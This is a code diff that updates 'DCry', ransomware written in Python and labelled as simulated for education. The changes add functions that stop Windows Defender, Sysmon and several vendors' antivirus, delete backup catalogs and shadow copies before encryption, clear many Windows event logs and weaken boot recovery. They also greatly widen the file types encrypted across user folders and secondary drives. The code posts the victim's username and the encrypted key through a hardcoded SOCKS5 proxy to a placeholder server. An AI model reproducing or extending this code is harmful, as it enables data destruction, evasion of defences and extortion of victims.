@@ -4,8 +4,8 @@
 ################################################################################
 # DISCLAIMER: This is a simulated ransomware (DCry), written for cybersecurity
 # research, ethical hacking education, and malware analysis training only.
-# It mimics behavior of real ransomware but must NOT be used for illegal or 
-# unauthorized activity. Run only in isolated environments (e.g., sandbox or VM) 
+# It mimics behavior of real ransomware but must NOT be used for illegal or
+# unauthorized activity. Run only in isolated environments (e.g., sandbox or VM)
 # under supervision of cybersecurity professionals.
 # The authors assume no liability for any misuse or damage caused.
 
@@ -27,11 +27,12 @@ from concurrent.futures import ThreadPoolExecutor
 
 import requests
 import winshell
-from Crypto.Cipher import AES # hidden import
+from Crypto.Cipher import AES  # hidden import
 from win32com.client import Dispatch
-from file_crypto import encrypt_file # type: ignore
+from file_crypto import encrypt_file  # type: ignore
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
+
 YOUR_URL = "YOUR_URL"
 # with open("url", "r") as f: YOUR_URL = f.read()
 id = ""
@@ -97,10 +98,26 @@ def disable_task_manager():
 def disable_recovery():
     execute_command("reagentc /disable")
     execute_command("bcdedit /set {default} recoveryenabled No")
+    execute_command("bcdedit /set {default} bootstatuspolicy ignoreallfailures")
 
 
 def clear_event_logs():
-    logs = ["Application", "System", "Security", "Setup"]
+    logs = [
+        "System",
+        "Security",
+        "Application",
+        "Setup",
+        "ForwardedEvents",
+        "Microsoft-Windows-TaskScheduler/Operational",
+        "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
+        "Microsoft-Windows-WindowsUpdateClient/Operational",
+        "Microsoft-Windows-GroupPolicy/Operational",
+        "Microsoft-Windows-PowerShell/Operational",
+        "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational",
+        "Microsoft-Windows-Security-Auditing",
+        "Microsoft-Windows-WinRM/Operational",
+        "Windows PowerShell",
+    ]
     for log in logs:
         execute_command(f"wevtutil cl {log}")
 
@@ -325,45 +342,59 @@ def start_encryption():
     key = bytearray(get_random_bytes(16))
     try:
         mlock(key)
-        
+
         key_b64 = base64.urlsafe_b64encode(b"DCRY+DKEY$" + bytes(key)).decode()
         encrypted_key = encrypt_key(key_b64.encode())
-        
+
         data = {
-            'username': os.getlogin(),
-            'id': str(id),
-            'date': datetime.now().strftime('%d-%m-%Y'), 
-            'key': base64.b64encode(encrypted_key).decode()
+            "username": os.getlogin(),
+            "id": str(id),
+            "date": datetime.now().strftime("%d-%m-%Y"),
+            "key": base64.b64encode(encrypted_key).decode(),
         }
-        
+
         proxies = {
-            'http': 'socks5h://146.190.245.171:1080',
-            'https': 'socks5h://146.190.245.171:1080'
-        } # Replace with your proxy if needed
+            "http": "socks5h://146.190.245.171:1080",
+            "https": "socks5h://146.190.245.171:1080",
+        }  # Replace with your proxy if needed
 
         try:
             requests.post(YOUR_URL, data=data, proxies=proxies, timeout=30)
         except requests.exceptions.RequestException as e:
             print(f"Error sending data: {e}")
 
-        with open(os.path.join(f"C:\\Users\\{getpass.getuser()}", "key.sha256"), "wb") as f:
+        with open(
+            os.path.join(f"C:\\Users\\{getpass.getuser()}", "key.sha256"), "wb"
+        ) as f:
             f.write(hashlib.sha256(bytes(key)).hexdigest().encode())
-            
-        encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Desktop"), key)
-        encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Downloads"), key)
-        encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Documents"), key)
-        encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Pictures"), key)
-        encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Videos"), key)
-        
+
+        encrypt_directory(
+            os.path.join(f"C:\\Users\\{getpass.getuser()}", "Desktop"), key
+        )
+        encrypt_directory(
+            os.path.join(f"C:\\Users\\{getpass.getuser()}", "Downloads"), key
+        )
+        encrypt_directory(
+            os.path.join(f"C:\\Users\\{getpass.getuser()}", "Documents"), key
+        )
+        encrypt_directory(
+            os.path.join(f"C:\\Users\\{getpass.getuser()}", "Pictures"), key
+        )
+        encrypt_directory(
+            os.path.join(f"C:\\Users\\{getpass.getuser()}", "Videos"), key
+        )
+
         bitmask = ctypes.windll.kernel32.GetLogicalDrives()
         for disk in [
             f"{letter}:/"
             for i, letter in enumerate(string.ascii_uppercase)
             if bitmask & (1 << i)
         ]:
-            if disk[:2] != os.getenv("SystemDrive") and disk[:2] != os.getenv("HOMEDRIVE"):
+            if disk[:2] != os.getenv("SystemDrive") and disk[:2] != os.getenv(
+                "HOMEDRIVE"
+            ):
                 encrypt_directory(disk, key)
-                
+
     finally:
         zeroize1(key)
         munlock(key)
@@ -371,18 +402,20 @@ def start_encryption():
 
 def encrypt_directory(directory_path, key):
     files_targeted = [
-        ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots",
-        ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc",
-        ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo",
-        ".cs", ".c", ".cc", ".cxx", ".cpp", ".pas", ".h", ".hpp", ".asm", ".go", ".kt", ".dart", ".scala", ".r", ".m", ".mm", ".hs", ".fs", ".fsi",
-        ".rs", ".php", ".js", ".cmd", ".bat", ".ps1", ".vbs", ".vbe", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".pm", ".swift",".py",
-        ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".lua",
-        ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif",
-        ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk",
-        ".bz2", ".paq", ".arc", ".aes", ".gpg", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".css",  ".ts", ".pyw",
-        ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", ".potm", ".potx",
-        ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm",
-        ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"
+        ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", 
+        ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", 
+        ".ldf", ".sln", ".suo", ".cs", ".c", ".cc", ".cxx", ".cpp", ".pas", ".h", ".hpp", ".asm", ".go", ".kt", ".dart", ".scala", ".r", ".m", ".mm", ".hs", ".fs", ".fsi", ".rs", ".php", ".js", ".cmd", ".bat", 
+        ".ps1", ".vbs", ".vbe", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".pm", ".swift", ".py", ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", 
+        ".vob", ".mpeg", ".asf", ".avi", ".lua", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", 
+        ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".paq", ".arc", ".aes", ".gpg", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", 
+        ".snt", ".onetoc2", ".css", ".ts", ".pyw", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", 
+        ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".md", 
+        ".tex", ".odt", ".doc", ".epub", ".mobi", ".fb2", ".azw", ".chm", ".xls", ".xlsx", ".srt", ".sub", ".ass", ".vtt", ".m4a", ".aac", ".flac", ".ogg", ".alac", ".ape", ".wma", ".tiff", ".tif", ".psd", 
+        ".ai", ".eps", ".raw", ".webp", ".heif", ".heic", ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".svg", ".indd", ".ps", ".pdf", ".epub", ".pub", ".odf", ".ods", ".odp", ".ott", ".sxi", ".rtf", ".txt", 
+        ".csv", ".tsv", ".xls", ".xlsx", ".ppt", ".pptx", ".docx", ".dotx", ".dotm", ".dot", ".dotb", ".odt", ".xml", ".json", ".yaml", ".yml", ".ini", ".bat", ".sh", ".cmd", ".ps1", ".vbs", ".pl", ".py", 
+        ".pyw", ".rb", ".php", ".jsp", ".html", ".css", ".scss", ".less", ".xml", ".json", ".yaml", ".ini", ".sql", ".sqlitedb", ".sqlite", ".dbf", ".mdb", ".accdb", ".bak", ".dat", ".cfg", ".ini", ".xml", 
+        ".json", ".sqlite", ".db", ".db3", ".sqlite3", ".ndb", ".csv", ".tsv", ".xlsx", ".xlsb", ".ods", ".psd", ".ai", ".eps", ".cdr", ".3ds", ".obj", ".stl", ".dwg", ".fbx", ".blend", ".gltf", ".usd", 
+        ".dae", ".x3d", ".pdf", ".epub", ".mobi", ".azw3", ".chm", ".xhtml", ".odt", ".docx", ".docm", ".pages", ".rtf", ".txt", ".html", ".xml", ".yaml", ".json", ".csv"
     ]
     with ThreadPoolExecutor(max_workers=8) as executor:
         futures = []
@@ -433,8 +466,12 @@ Don't Cry =}}"""
     shortcut.Arguments = file_path
     shortcut.save()
     file_path = os.path.join(os.getenv("SystemDrive"), "pagefile.sys")
-    execute_command('wmic computersystem where name="%computername%" set AutomaticManagedPagefile=False')
-    execute_command(f"wmic pagefileset where \"name='{os.getenv("SystemDrive")}\\pagefile.sys'\" delete")
+    execute_command(
+        'wmic computersystem where name="%computername%" set AutomaticManagedPagefile=False'
+    )
+    execute_command(
+        f"wmic pagefileset where \"name='{os.getenv("SystemDrive")}\\pagefile.sys'\" delete"
+    )
     clear_event_logs()
     execute_command("shutdown /r /f /t 2")
     disable_cmd()
@@ -446,11 +483,31 @@ def execute_command(command, shell=True):
     ).wait()
 
 
+def disable_AV():
+    execute_command("net stop WinDefend")
+    execute_command("sc config WinDefend start = disabled")
+    execute_command("net stop wuauserv")
+    execute_command("sc config wuauserv start = disabled")
+    execute_command("net stop bits")
+    execute_command("sc config bits start = disabled")
+    execute_command("net stop wscsvc")
+    execute_command("sc config wscsvc start = disabled")
+    execute_command("wbadmin delete catalog -quiet")
+    execute_command("taskkill /f /im MsMpEng.exe")
+    execute_command("taskkill /f /im Sophos*")
+    execute_command("taskkill /f /im McAfee*")
+    execute_command("net stop SysmonLog")
+    execute_command("net stop SysmonDrv")
+    execute_command("net stop AVP*")
+    execute_command("net stop SEP*")
+
+
 def disable_all():
     disable_regedit()
     disable_powershell()
     disable_recovery()
     disable_task_manager()
+    disable_AV()
 
 
 dev_mode = True
@@ -466,7 +523,7 @@ if __name__ == "__main__":
         freeze_keyboard()
         block_processes()
         disable_all()
-        start_encryption()
         delete_shadow_copy()
+        start_encryption()
         change_wallpaper()
         shutdown()
